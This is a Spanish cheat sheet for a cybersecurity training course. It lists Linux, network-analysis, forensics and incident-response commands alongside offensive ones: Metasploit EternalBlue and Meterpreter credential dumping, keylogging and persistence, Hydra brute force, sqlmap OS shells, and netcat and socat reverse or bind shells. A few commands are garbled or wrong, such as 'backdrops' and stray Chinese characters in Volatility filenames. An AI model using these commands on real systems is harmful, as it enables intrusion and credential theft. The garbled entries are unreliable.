# CHEATSHEET - Curso Tectonic BHU Uruguay

Referencia rapida de todos los comandos y herramientas utilizados en el curso de ciberguridad Tectonic.

---

## Plataforma Tectonic

Gestion de entornos de laboratorio desde la linea de comandos.

### Crear imagenes

```bash
tectonic create-images --base-image ubuntu:20.04 --name mi-lab
tectonic create-images --from-snapshot snap-id-123 --name lab-clonado
```

### Desplegar entorno

```bash
tectonic deploy --lab mi-lab --students 20
tectonic deploy --lab mi-lab --students 20 --duration 2h
```

### Destruir entorno

```bash
tectonic destroy --lab mi-lab
tectonic destroy --all
```

### Listar laboratorios

```bash
tectonic list
tectonic list --status running
tectonic list --format table
```

### Acceso de estudiante

```bash
tectonic student-access --lab mi-lab --student 1
tectonic student-access --lab mi-lab --student 1 --ssh-key ~/.ssh/id_rsa.pub
```

### Acceso de instructor

```bash
tectonic instructor-access --lab mi-lab
tectonic instructor-access --lab mi-lab --console
```

### Estado del laboratorio

```bash
tectonic status --lab mi-lab
tectonic status --lab mi-lab --verbose
```

---

## Fundamentos Linux

### Operaciones con archivos

```bash
ls                          # Listar archivos del directorio actual
ls -la                      # Listar todos los archivos con permisos y detalles
ls -lh                      # Listar con tamanos legibles (KB, MB, GB)
ls -R                       # Listar recursivamente subdirectorios

cd /ruta/directorio         # Cambiar de directorio
cd ~                        # Ir al directorio home
cd -                        # Volver al directorio anterior

cp archivo destino          # Copiar archivo
cp -r directorio destino    # Copiar directorio recursivamente
cp -p archivo destino       # Copiar conservando permisos y timestamps

mv archivo destino          # Mover o renombrar archivo
mv viejo.txt nuevo.txt      # Renombrar archivo

rm archivo                  # Eliminar archivo
rm -r directorio            # Eliminar directorio recursivamente
rm -f archivo               # Eliminar sin confirmacion
rm -rf directorio           # Eliminar directorio sin confirmacion

mkdir nueva_carpeta         # Crear directorio
mkdir -p ruta/nueva/carpeta # Crear directorios anidados

find / -name "*.conf"       # Buscar archivos por nombre
find / -size +100M          # Buscar archivos mayores a 100MB
find / -user root           # Buscar archivos de un usuario
find / -perm 777            # Buscar archivos con permisos especificos
find / -mtime -1            # Buscar archivos modificados en las ultimas 24h

locate archivo              # Buscar archivo en la base de datos de archivos
updatedb                    # Actualizar la base de datos de locate
```

### Procesamiento de texto

```bash
cat archivo                 # Mostrar contenido completo de un archivo
cat -n archivo              # Mostrar con numeros de linea

head -20 archivo            # Mostrar primeras 20 lineas
tail -20 archivo            # Mostrar ultimas 20 lineas
tail -f /var/log/syslog     # Seguir archivo en tiempo real

grep "texto" archivo        # Buscar texto en archivo
grep -i "texto" archivo     # Buscar sin distinguir mayusculas/minusculas
grep -r "texto" /directorio # Buscar recursivamente en directorio
grep -n "texto" archivo     # Mostrar numeros de linea
grep -c "texto" archivo     # Contar coincidencias
grep -v "texto" archivo     # Invertir coincidencias (excluir)
grep -E "regex" archivo     # Buscar con expresion regular

awk '{print $1}' archivo    # Imprimir primera columna
awk -F: '{print $1}' archivo # Usar delimitador especifico
awk '/patron/ {print}' archivo # Filtrar lineas por patron

sed 's/viejo/nuevo/g' archivo # Reemplazar texto
sed -i 's/viejo/nuevo/g' archivo # Reemplazar en el archivo original
sed -n '5,10p' archivo      # Mostrar lineas 5 a 10

cut -d: -f1 /etc/passwd     # Extraer campos con delimitador
cut -c1-10 archivo          # Extraer caracteres 1 a 10

sort archivo                # Ordenar lineas
sort -u archivo             # Ordenar y eliminar duplicados

uniq archivo                # Eliminar lineas duplicadas consecutivas
uniq -c archivo             # Contar ocurrencias

wc -l archivo               # Contar lineas
wc -w archivo               # Contar palabras
wc -c archivo               # Contar bytes
```

### Permisos

```bash
chmod 755 archivo           # Establecer permisos numericos (rwxr-xr-x)
chmod +x script.sh          # Dar permiso de ejecucion
chmod -R 755 directorio     # Cambiar permisos recursivamente

chown usuario:grupo archivo # Cambiar propietario y grupo
chown -R usuario:grupo dir  # Cambiar recursivamente

ls -la                      # Ver permisos detallados
# Formato: drwxr-xr-x
# d = directorio, l = enlace simbolico
# rwx = propietario, r-x = grupo, r-x = otros
# r=4, w=2, x=1
```

### Gestion de procesos

```bash
ps aux                      # Listar todos los procesos en ejecucion
ps aux | grep nginx         # Filtrar proceso especifico
ps -ef                      # Listar procesos con PPID

top                         # Monitor de procesos en tiempo real
htop                        # Monitor de procesos mejorado (si esta instalado)

kill PID                    # Matar proceso por PID
kill -9 PID                 # Forzar eliminacion de proceso
kill -15 PID                # Senal de terminacion graceful

pkill nombre_proceso        # Matar procesos por nombre
pkill -f "patron"           # Matar por patron completo de la linea de comando
killall nginx               # Matar todos los procesos con ese nombre
```

### Red

```bash
ifconfig                    # Mostrar interfaces de red (clasico)
ip a                        # Mostrar interfaces de red (moderno)
ip addr show eth0           # Detalle de interfaz especifica
ip route show               # Mostrar tabla de enrutamiento

netstat -tlnp               # Puertos TCP escuchando
netstat -ulnp               # Puertos UDP escuchando
netstat -anp                 # Todas las conexiones activas
ss -tlnp                    # Puertos TCP escuchando (moderno)
ss -ulnp                    # Puertos UDP escuchando (moderno)
ss -anp                     # Todas las conexiones (moderno)

ping 192.168.1.1            # Probar conectividad
ping -c 4 192.168.1.1       # Enviar 4 paquetes

traceroute 8.8.8.8          # Ruta hacia un destino
tracepath 8.8.8.8           # Ruta con MTU

dig ejemplo.com             # Consulta DNS completa
dig @8.8.8.8 ejemplo.com    # Consulta DNS con servidor especifico
dig +short ejemplo.com      # Respuesta corta

nslookup ejemplo.com        # Resolucion DNS basica
nslookup ejemplo.com 8.8.8.8 # Usar servidor DNS especifico

host ejemplo.com            # Resolucion DNS simple
host -t MX ejemplo.com      # Consultar registros MX
```

### Sistema

```bash
systemctl start nginx       # Iniciar servicio
systemctl stop nginx        # Detener servicio
systemctl restart nginx     # Reiniciar servicio
systemctl status nginx      # Ver estado del servicio
systemctl enable nginx      # Habilitar al iniciar sistema
systemctl disable nginx     # Deshabilitar al iniciar sistema
systemctl list-units --type=service # Listar servicios

uname -a                    # Informacion completa del sistema
uname -r                    # Version del kernel

df -h                       # Uso de disco en formato legible
df -h /                     # Uso de disco de la particion raiz

free -m                     # Uso de memoria en MB
free -h                     # Uso de memoria en formato legible

uptime                      # Tiempo de actividad y carga promedio

whoami                      # Usuario actual
id                          # UID, GID y grupos del usuario
w                           # Usuarios conectados y sus procesos
last                        # Historial de sesiones
history                     # Historial de comandos
```

---

## Analisis de Red (Wireshark/tcpdump)

### Captura con tcpdump

```bash
tcpdump -i eth0                         # Capturar en interfaz eth0
tcpdump -i any                          # Capturar en todas las interfaces
tcpdump -i eth0 -c 100                  # Capturar 100 paquetes y detener
tcpdump -i eth0 -w captura.pcap         # Guardar captura en archivo
tcpdump -r captura.pcap                 # Leer archivo de captura

tcpdump -i eth0 host 192.168.1.1       # Filtrar por host
tcpdump -i eth0 src host 192.168.1.1   # Filtrar por origen
tcpdump -i eth0 dst host 192.168.1.1   # Filtrar por destino
tcpdump -i eth0 port 80                # Filtrar por puerto
tcpdump -i eth0 portrange 1-1024       # Filtrar rango de puertos

tcpdump -i eth0 tcp                    # Solo paquetes TCP
tcpdump -i eth0 udp                    # Solo paquetes UDP
tcpdump -i eth0 icmp                   # Solo paquetes ICMP

tcpdump -i eth0 -A                     # Mostrar payload en ASCII
tcpdump -i eth0 -X                     # Mostrar payload en hex y ASCII
tcpdump -i eth0 -nn                    # No resolver nombres
tcpdump -i eth0 -v                     # Modo verbose
tcpdump -i eth0 -vv                    # Modo verbose doble

tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'  # Capturar paquetes SYN
tcpdump -i eth0 'port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' # HTTP con datos
```

### Filtros de visualizacion en Wireshark

```
# HTTP
http                             # Todo el trafico HTTP
http.request                     # Solicitudes HTTP
http.response                    # Respuestas HTTP
http.request.method == "GET"     # Metodos GET
http.request.method == "POST"    # Metodos POST
http.host contains "ejemplo"     # Host contiene texto
http.request.uri contains "login" # URI contiene texto
http.response.code == 200        # Codigo de respuesta 200
http.response.code == 404        # Pagina no encontrada
http.content_type contains "text" # Tipo de contenido

# DNS
dns                              # Todo el trafico DNS
dns.qry.name == "ejemplo.com"   # Consulta especifica
dns.resp.name contains "ejemplo" # Respuesta contiene texto
dns.flags.rcode != 0            # Errores DNS

# TCP
tcp                              # Todo el trafico TCP
tcp.flags.syn == 1              # Paquetes SYN
tcp.flags.rst == 1              # Paquetes RST
tcp.flags.fin == 1              # Paquetes FIN
tcp.analysis.retransmission     # Retransmisiones
tcp.analysis.zero_window        # Ventana cero
tcp.port == 443                 # Puerto 443
tcp.stream eq 5                 # Flujo TCP especifico

# UDP
udp                              # Todo el trafico UDP
udp.port == 53                  # DNS por UDP

# IP
ip.addr == 192.168.1.1         # Cualquier trafico con esa IP
ip.src == 192.168.1.1          # IP origen
ip.dst == 192.168.1.1          # IP destino
ip.ttl < 5                     # TTL bajo (posible bucle)

# Filtros combinados
tcp.port == 80 && http.request.method == "POST" # POST por HTTP
ip.src == 192.168.1.1 && tcp.dstport == 443    # Trafico HTTPS de un host
dns && !dns.flags.rcode == 0                    # Errores DNS
(http || dns) && ip.addr == 192.168.1.10        # HTTP o DNS de un host
```

---

## Escaneo con Nmap

### Escaneos basicos

```bash
nmap 192.168.1.1                      # Escaneo basico de puertos comunes
nmap -sS 192.168.1.1                  # Escaneo SYN stealth (requiere root)
nmap -sT 192.168.1.1                  # Escaneo TCP connect (sin root)
nmap -sU 192.168.1.1                  # Escaneo UDP
nmap -sV 192.168.1.1                  # Detectar versiones de servicios
nmap -O 192.168.1.1                   # Detectar sistema operativo
nmap -A 192.168.1.1                   # Escaneo agresivo (version + OS + scripts)
```

### Rangos de puertos

```bash
nmap -p- 192.168.1.1                  # Todos los puertos (1-65535)
nmap -p 1-1000 192.168.1.1           # Rango de puertos
nmap -p 80,443,8080 192.168.1.1      # Puertos especificos
nmap --top-ports 100 192.168.1.1     # Los 100 puertos mas comunes
```

### Escaneo con scripts (NSE)

```bash
nmap --script default 192.168.1.1           # Scripts por defecto
nmap --script vuln 192.168.1.1             # Deteccion de vulnerabilidades
nmap --script http-enum 192.168.1.1        # Enumerar directorios web
nmap --script http-sql-injection 192.168.1.1 # Buscar inyeccion SQL
nmap --script smb-enum-shares 192.168.1.1  # Enumerar compartidos SMB
nmap --script smb-enum-users 192.168.1.1   # Enumerar usuarios SMB
nmap --script ftp-anon 192.168.1.1         # Verificar acceso anonimo FTP
nmap --script ssh-auth-methods 192.168.1.1 # Metodos de autenticacion SSH
nmap --script ssl-heartbleed 192.168.1.1   # Verificar Heartbleed
```

### Opciones adicionales

```bash
nmap -T0 192.168.1.1                  # Timing paranoid (lento, evita IDS)
nmap -T3 192.168.1.1                  # Timing normal (por defecto)
nmap -T4 192.168.1.1                  # Timing agresivo
nmap -T5 192.168.1.1                  # Timing insano (muy rapido)
nmap -Pn 192.168.1.1                  # No hacer ping, asumir host activo
nmap -sn 192.168.1.0/24               # Descubrimiento de hosts (sin escaneo de puertos)
nmap -oN resultados.txt 192.168.1.1   # Guardar resultados en texto
nmap -oX resultados.xml 192.168.1.1   # Guardar resultados en XML
nmap -oG resultados.gnmap 192.168.1.1 # Guardar en formato grepable
```

---

## Metasploit

### Consola msfconsole

```bash
msfconsole                              # Iniciar consola Metasploit

msf6> search eternalblue                # Buscar exploits/modulos
msf6> search type:exploit platform:windows smb # Busqueda avanzada

msf6> use exploit/windows/smb/ms17_010_eternalblue # Seleccionar modulo
msf6> info                             # Informacion del modulo
msf6> show options                     # Mostrar opciones configurables
msf6> show payloads                    # Mostrar payloads compatibles
msf6> show targets                     # Mostrar objetivos disponibles

msf6> set RHOSTS 192.168.1.10         # Configurar host objetivo
msf6> set LHOST 192.168.1.20          # Configurar host local (listener)
msf6> set LPORT 4444                   # Configurar puerto local
msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp # Seleccionar payload
msf6> setg RHOSTS 192.168.1.10        # Configuracion global

msf6> exploit                           # Ejecutar exploit
msf6> exploit -j                        # Ejecutar en segundo plano (job)
msf6> check                             # Verificar si el objetivo es vulnerable

msf6> back                              # Volver al contexto anterior
msf6> backdrops                         # Volver al contexto raiz
msf6> jobs                              # Listar jobs activos
msf6> sessions                          # Listar sesiones activas
msf6> sessions -i 1                     # Interactuar con sesion 1
msf6> sessions -k 1                     # Matar sesion 1
```

### Meterpreter

```bash
meterpreter> sysinfo                    # Informacion del sistema
meterpreter> getuid                     # Usuario actual
meterpreter> getpid                     # PID del proceso actual
meterpreter> hashdump                   # Dump de hashes SAM
meterpreter> shell                      # Obtener shell del sistema
meterpreter> bg                         # Background de la sesion

meterpreter> download C:\Users\file.txt /local/ # Descargar archivo
meterpreter> upload /local/file.txt C:\Users\   # Subir archivo

meterpreter> getsystem                  # Escalada de privilegios
meterpreter> privs                      # Privilegios actuales

meterpreter> ps                         # Listar procesos
meterpreter> migrate PID                # Migrar a otro proceso

meterpreter> getsystem                  # Intentar escalar a SYSTEM
meterpreter> load kiwi                  # Cargar extensión mimikatz
meterpreter> creds_all                  # Extraer credenciales
meterpreter> lsa_dump_sam               # Dump SAM via LSA

meterpreter> screenshot                 # Captura de pantalla
meterpreter> keyscan_start              # Iniciar keylogger
meterpreter> keyscan_dump               # Obtener resultados del keylogger
meterpreter> keyscan_stop               # Detener keylogger

meterpreter> ipconfig                   # Ver configuracion de red
meterpreter> route                      # Ver tabla de enrutamiento
meterpreter> arp                        # Ver tabla ARP

meterpreter> persistence -U -i -r 192.168.1.20 -p 4444 # Instalar persistencia
```

---

## Ataques de Contrasenas

### John the Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt          # Fuerza bruta con wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hash.txt # Formato especifico
john --show hash.txt                                  # Mostrar contrasenas crackeadas
john --list=formats                                   # Listar formatos soportados
john --list --format=raw-md5                          # Verificar soporte de formato

# Formatos comunes:
# --format=raw-md5       MD5 sin sal
# --format=raw-sha256    SHA256 sin sal
# --format=md5crypt      MD5 Unix (passwd)
# --format=sha512crypt   SHA512 Unix (passwd)
# --format=des           DES Unix (passwd)
# --format=netntlmv2     NetNTLMv2 (Windows)
# --format=bcrypt        Blowfish/OpenBSD

# Para archivos shadow:
unshadow /etc/passwd /etc/shadow > unshadowed.txt   # Combinar passwd y shadow
john --wordlist=rockyou.txt unshadowed.txt           # Crackear hashes combinados
```

### Hashcat

```bash
# Modos (-m):
hashcat -m 0 hash.txt wordlist.txt          # MD5
hashcat -m 100 hash.txt wordlist.txt        # SHA1
hashcat -m 1400 hash.txt wordlist.txt       # SHA256
hashcat -m 1800 hash.txt wordlist.txt       # SHA512
hashcat -m 3200 hash.txt wordlist.txt       # bcrypt
hashcat -m 5500 hash.txt wordlist.txt       # NetNTLMv1
hashcat -m 5600 hash.txt wordlist.txt       # NetNTLMv2
hashcat -m 1000 hash.txt wordlist.txt       # NTLM
hashcat -m 2100 hash.txt wordlist.txt       # DCC2 (Domain Cached Credentials)
hashcat -m 13100 hash.txt wordlist.txt      # Kerberos TGS-REP

# Ataques (-a):
hashcat -a 0 -m 0 hash.txt wordlist.txt    # Ataque de diccionario
hashcat -a 3 -m 0 hash.txt ?a?a?a?a?a?a   # Ataque de fuerza bruta (mascara)
hashcat -a 6 -m 0 hash.txt wordlist.txt ?a?a?a?a # Hibrido diccionario + fuerza bruta

# Mascaras:
# ?l = minuscula (a-z)
# ?u = mayuscula (A-Z)
# ?d = digito (0-9)
# ?s = especial (!@#$...)
# ?a = todos los caracteres
# ?b = caracteres binarios (0x00-0xff)

# Opciones utiles:
hashcat -m 0 hash.txt wordlist.txt --show   # Mostrar resultados
hashcat -m 0 hash.txt wordlist.txt -o salida.txt # Guardar en archivo
hashcat -m 0 hash.txt wordlist.txt -r rules/best64.rule # Aplicar reglas
```

### Hydra

```bash
# Fuerza bruta SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh
hydra -L usuarios.txt -P contrasenas.txt 192.168.1.1 ssh -t 4

# Fuerza bruta FTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ftp
hydra -l anonymous -P password.txt 192.168.1.1 ftp

# Fuerza bruta HTTP Basic Auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 http-get /admin

# Fuerza bruta HTTP Login Form
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrecto"

# Fuerza bruta RDP
hydra -l administrator -P rockyou.txt 192.168.1.1 rdp

# Fuerza bruta MySQL
hydra -l root -P rockyou.txt 192.168.1.1 mysql

# Opciones:
# -l usuario        Usuario especifico
# -L archivo.txt    Lista de usuarios
# -p password       Contrasena especifica
# -P archivo.txt    Lista de contrasenas
# -t 16             Hilos (conexion simultaneas, default 16)
# -vV               Modo verbose con login
# -f                Parar al encontrar primera credencial
# -o salida.txt     Guardar resultados en archivo
```

---

## Ataques Web

### SQLmap

```bash
# Basico
sqlmap -u "http://ejemplo.com/page?id=1"                         # Detectar inyeccion
sqlmap -u "http://ejemplo.com/page?id=1" --dbs                  # Listar bases de datos
sqlmap -u "http://ejemplo.com/page?id=1" -D base_datos --tables # Listar tablas
sqlmap -u "http://ejemplo.com/page?id=1" -D base -T usuarios --dump # Volcar tabla

# POST request
sqlmap -u "http://ejemplo.com/login" --data="user=admin&pass=123" --dbs

# Con cookies
sqlmap -u "http://ejemplo.com/page?id=1" --cookie="session=abc123" --dbs

# Con headers personalizados
sqlmap -u "http://ejemplo.com/page?id=1" --headers="Authorization: Bearer token" --dbs

# Nivel de prueba
sqlmap -u "http://ejemplo.com/page?id=1" --level=5 --risk=3    # Maximo nivel

# Obtener shell
sqlmap -u "http://ejemplo.com/page?id=1" --os-shell             # Shell del SO
sqlmap -u "http://ejemplo.com/page?id=1" --sql-shell            # Shell SQL
sqlmap -u "http://ejemplo.com/page?id=1" --file-read="/etc/passwd" # Leer archivo

# Tamizar
sqlmap -u "http://ejemplo.com/page?id=1" --batch --smart        # Automatico

# Opciones:
# --dbs              Listar bases de datos
# --tables           Listar tablas
# --columns          Listar columnas
# --dump             Volcar datos
# --current-db       Base de datos actual
# --current-user     Usuario actual
# --is-dba           Verificar si es DBA
# --passwords        Hashes de contrasenas
```

### Dirb / Gobuster

```bash
# Dirb
dirb http://ejemplo.com                                        # Busqueda basica
dirb http://ejemplo.com /usr/share/wordlists/dirb/common.txt   # Wordlist especifica
dirb http://ejemplo.com -r                                      # No recursivo
dirb http://ejemplo.com -S                                      # Silencioso

# Gobuster
gobuster dir -u http://ejemplo.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u http://ejemplo.com -w wordlist.txt -x php,html,txt   # Extensiones
gobuster dir -u http://ejemplo.com -w wordlist.txt -t 50             # Hilos
gobuster dir -u http://ejemplo.com -w wordlist.txt -b 403,404        # Excluir codigos
gobuster dir -u http://ejemplo.com -w wordlist.txt -s 200,301,302    # Incluir codigos

# Subdominios
gobuster dns -d ejemplo.com -w subdomains.txt -t 50

# Virtual hosts
gobuster vhost -u http://ejemplo.com -w vhosts.txt -t 50
```

### curl / wget

```bash
# GET basico
curl http://ejemplo.com

# POST con datos
curl -X POST http://ejemplo.com/login -d "user=admin&pass=123"

# Headers personalizados
curl -H "Authorization: Bearer token123" http://ejemplo.com/api
curl -H "Content-Type: application/json" -d '{"key":"value"}' http://ejemplo.com

# Con cookies
curl -b "session=abc123" http://ejemplo.com
curl -c cookies.txt -b cookies.txt http://ejemplo.com  # Guardar y reusar cookies

# Ver cookies
curl -v http://ejemplo.com 2>&1 | grep -i "set-cookie"

# Verificar estado
curl -o /dev/null -s -w "%{http_code}" http://ejemplo.com

# Seguir redirecciones
curl -L http://ejemplo.com

# Verbose (debug)
curl -v http://ejemplo.com

# POST JSON
curl -X POST http://ejemplo.com/api -H "Content-Type: application/json" -d '{"user":"admin"}'

# wget basico
wget http://ejemplo.com/archivo.txt
wget -r http://ejemplo.com/           # Descarga recursiva
wget --post-data="user=admin" http://ejemplo.com/login  # POST
wget -q http://ejemplo.com           # Silencioso
```

---

## Analisis Forense

### Volatility

```bash
# Informacion de la imagen
volatility -f memoria.raw imageinfo
volatility -f memoria.raw windows.info

# Procesos
volatility -f memoria.raw pslist                # Lista de procesos
volatility -f memoria.raw pstree                # Arbol de procesos
volatility -f memoria.raw psscan                # Escaneo de procesos (ocultos)
volatility -f memoria.raw psxview               # Ver procesos con multiples metodos

# Red
volatility -f memoria.raw netscan              # Conexiones de red activas
volatility -f memoria.raw connections           # Conexiones activas
volatility -f memoria.raw sockets              # Sockets abiertos

# Archivos
volatility -f memoria.raw filescan             # Escaneo de archivos
volatility -f memoria.raw dumpfiles -D salida -Q OFFSET  # Volcar archivo por offset

# DLLs y handles
volatility -f memoria.raw ldrmodules           # DLLs cargadas
volatility -f memoria.raw dlllist              # Lista de DLLs por proceso
volatility -f memoria.raw handles              # Handles abiertos por proceso

# Registro
volatility -f memoria.raw hivelist             # Hives de registro
volatility -f memoria.raw userassist           # Actividad de usuario
volatility -f memoria.raw shellbags            # Shellbags

# Passwd y credenciales
volatility -f memoria.raw hashdump             # Dump de hashes
volatility -f memoria.raw lsadump              # Dump LSA secrets
volatility -f memoria.raw cachedump            # Cached domain credentials

# Commandos
volatility -f memoria.raw cmdscan              # Historial de cmd
volatility -f memoria.raw consoles             # Consolas
volatility -f memoria.raw envars               # Variables de entorno

# Navegador
volatility -f内存.raw iehistory               # Historial de IE
volatility -f memoria.raw browsers            # Informacion de navegador

# Registro de eventos
volatility -f memoria.raw evtxlist             # Listar logs de eventos
volatility -f内存.raw evtxdump -D salida      # Volcar logs de eventos
```

### Herramientas de analisis de archivos

```bash
# strings - Buscar cadenas de texto en archivos binarios
strings archivo                         # Imprimir cadenas ASCII
strings -n 6 archivo                    # Cadenas de minimo 6 caracteres
strings -e l archivo                    # Unicode little-endian
strings -e L archivo                    # Unicode big-endian
strings -n 8 archivo | grep -i pass     # Buscar contrasenas en binarios

# file - Identificar tipo de archivo
file archivo                            # Tipo de archivo
file -i archivo                         # Tipo MIME
file -b archivo                         # Sin nombre de archivo

# hexdump / xxd - Analisis hexadecimal
hexdump -C archivo | head -50           # Hexdump con offset y ASCII
xxd archivo | head -50                  # Hexdump en formato estandar
xxd -i archivo > hex.txt               # Convertir a array de C

# Otras herramientas
binwalk archivo                         # Analizar contenido embebido
foremost archivo.img -o salida          # Recuperar archivos eliminados
testdisk archivo.img                    # Recuperar particiones
exiftool imagen.jpg                     # Metadatos EXIF
steghide extract -sf imagen.jpg         # Extraer datos ocultos (esteganografia)
```

---

## Respuesta a Incidentes

### Analisis de logs

```bash
# Logs de autenticacion
cat /var/log/auth.log                   # Logs de autenticacion (Debian/Ubuntu)
cat /var/log/secure                     # Logs de autenticacion (RHEL/CentOS)
grep "Failed password" /var/log/auth.log              # Intentos fallidos
grep "Accepted password" /var/log/auth.log             # Ingresos exitosos
grep "Invalid user" /var/log/auth.log                 # Usuarios inexistentes
grep "session opened" /var/log/auth.log               # Sesiones abiertas
last -i                                   # Ultimas conexiones con IP
lastb                                    # Intentos fallidos de login

# Logs del sistema
cat /var/log/syslog                      # Log general (Debian/Ubuntu)
cat /var/log/messages                    # Log general (RHEL/CentOS)
grep "error\|fail\|denied" /var/log/syslog # Filtrar errores

# Logs de Apache
cat /var/log/apache2/access.log          # Accesos web
cat /var/log/apache2/error.log           # Errores web
cat /var/log/nginx/access.log            # Accesos web Nginx
cat /var/log/nginx/error.log             # Errores web Nginx
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head # IPs mas frecuentes
grep "POST" /var/log/apache2/access.log              # Peticiones POST
grep "404" /var/log/apache2/access.log               # Paginas no encontradas
grep "php\|cmd\|exec\|eval" /var/log/apache2/access.log # Posibles ataques

# Logs de MySQL
cat /var/log/mysql/error.log             # Errores de MySQL
cat /var/log/mysql/general.log           # Consultas generales (si esta habilitado)

# Logs de firewall
cat /var/log/ufw.log                     # Firewall UFW
grep "BLOCK" /var/log/ufw.log           # Conexiones bloqueadas
grep "ALLOW" /var/log/ufw.log           # Conexiones permitidas

# Busqueda de indicadores de compromiso
grep -i "backdoor\|rootkit\|malware" /var/log/syslog
grep -r "base64" /var/log/               # Buscar codificaciones sospechosas
grep -r "curl\|wget" /var/log/apache2/   # Descargas desde servidor web
grep -r "nc -e\|ncat\|nc " /var/log/     # Netcat sospechoso
```

### Investigacion de conexiones de red

```bash
# Conexiones activas
netstat -tlnp                            # Puertos TCP escuchando
netstat -anp                             # Todas las conexiones
ss -tunap                                # Conexiones con proceso

# Verificar conexiones sospechosas
netstat -anp | grep ESTABLISHED          # Conexiones establecidas
netstat -anp | grep ":4444"             # Puertos comunes de reverse shell
netstat -anp | grep ":4444\|:5555\|:6666\|:1337" # Puertos tipicos de C2

# Verificar procesos
ps aux | grep -E "nc |ncat |python |perl |ruby " # Procesos sospechosos
lsof -i -P -n                           # Archivos abiertos con conexiones de red
lsof -i :80                             # Procesos usando puerto 80

# Verificar cron jobs
crontab -l                              # Cron del usuario actual
ls -la /etc/cron*                       # Cron jobs del sistema
cat /etc/crontab                        # Cron del sistema
ls -la /var/spool/cron/crontabs/        # Cron de todos los usuarios

# Verificar usuarios y permisos
cat /etc/passwd                         # Usuarios del sistema
cat /etc/shadow                         # Hashes de contrasenas (requiere root)
grep ":0:" /etc/passwd                  # Usuarios con UID 0 (root)
w                                         # Usuarios conectados
last -10                                 # Ultimas 10 sesiones
```

---

## PowerShell (Windows)

### Informacion del sistema

```powershell
Get-Process                              # Listar procesos
Get-Process -Name chrome                 # Proceso especifico
Get-Process | Sort-Object CPU -Descending # Ordenar por CPU
Get-Service                              # Listar servicios
Get-Service -Name "WinRM"               # Servicio especifico
Get-Service | Where-Object {$_.Status -eq "Running"} # Servicios activos

Get-EventLog -LogName Security -Newest 50          # Ultimos 50 eventos de seguridad
Get-EventLog -LogName System -EntryType Error      # Errores del sistema
Get-WinEvent -FilterHashtable @{LogName="Security"; ID=4624} # Ingresos exitosos
Get-WinEvent -FilterHashtable @{LogName="Security"; ID=4625} # Ingresos fallidos
```

### Red

```powershell
Invoke-WebRequest -Uri "http://ejemplo.com"               # Peticion web basica
Invoke-WebRequest -Uri "http://ejemplo.com" -OutFile out.txt # Descargar archivo
Invoke-WebRequest -Uri "http://ejemplo.com" -Method POST -Body "data=value" # POST

Test-NetConnection -ComputerName 192.168.1.1 -Port 80    # Probar conexion a puerto
Test-NetConnection -ComputerName 192.168.1.1              # Ping de prueba

Get-NetAdapter                           # Adaptadores de red
Get-NetIPAddress                         # Direcciones IP
Get-DnsClientServerAddress               # Servidores DNS
Resolve-DnsName ejemplo.com             # Resolucion DNS
```

### Archivos y sistema

```powershell
Get-ChildItem                             # Listar archivos (alias de ls/dir)
Get-ChildItem -Recurse -Filter "*.log"   # Buscar archivos .log recursivamente
Get-Content archivo.txt                  # Leer contenido de archivo
Set-Content archivo.txt "contenido"      # Escribir contenido

Get-History                              # Historial de comandos
Get-ExecutionPolicy                      # Politica de ejecucion actual
Set-ExecutionPolicy Bypass -Scope Process # Bypass temporal

[System.Environment]::OSVersion          # Version del SO
hostname                                 # Nombre del equipo
whoami                                   # Usuario actual
[System.Security.Principal.WindowsIdentity]::GetCurrent() # Identidad completa

Get-LocalUser                            # Usuarios locales
Get-LocalGroup                           # Grupos locales
net user                                 # Usuarios (cmd)
net localgroup administrators            # Administradores (cmd)

Get-WmiObject Win32_OperatingSystem | Select-Object FreePhysicalMemory   # Memoria libre
Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID,FreeSpace       # Disco libre
Get-WmiObject Win32_Processor | Select-Object Name,LoadPercentage        # CPU

Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"     # Claves de persistencia
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"  # Ver valores
```

---

## Utilidades Generales

### Compresion y transferencia

```bash
# Compresion
tar -czvf archivo.tar.gz directorio/     # Comprimir en tar.gz
tar -xzvf archivo.tar.gz                 # Extraer tar.gz
zip -r archivo.zip directorio/            # Comprimir en zip
unzip archivo.zip                         # Extrair zip

# Transferencia de archivos
scp archivo.txt usuario@192.168.1.1:/remoto/  # Copiar via SCP
scp usuario@192.168.1.1:/remoto/archivo.txt ./ # Descargar via SCP
rsync -avz origen/ usuario@192.168.1.1:/destino/ # Sincronizar con rsync
```

### Servicios web rapidos

```bash
# Python - servidor web
python3 -m http.server 8080             # Servidor HTTP en puerto 8080
python -m SimpleHTTPServer 8000          # Python 2

# Netcat - servidor y cliente
nc -lvp 4444                            # Escuchar en puerto 4444
nc 192.168.1.1 4444                     # Conectar a puerto
nc -lvp 4444 -e /bin/bash               # Shell reversa (escuchar)
nc 192.168.1.20 4444 -e /bin/bash       # Shell reversa (conectar)

# Socat - alternativa a netcat
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash  # Shell inversa
```

### Codificacion y hashes

```bash
# Base64
echo "texto" | base64                   # Codificar a Base64
echo "dGV4dG8=" | base64 -d            # Decodificar Base64

# Hashes
echo -n "texto" | md5sum               # MD5
echo -n "texto" | sha1sum              # SHA1
echo -n "texto" | sha256sum            # SHA256
echo -n "texto" | sha512sum            # SHA512

# URL encoding
python3 -c "import urllib.parse; print(urllib.parse.quote('texto especial'))"
python3 -c "import urllib.parse; print(urllib.parse.unquote('texto%20especial'))"
```

---

## Wordlists comunes en Kali Linux

```bash
/usr/share/wordlists/rockyou.txt                                    # Contrasenas generales
/usr/share/wordlists/dirb/common.txt                                # Directorios web
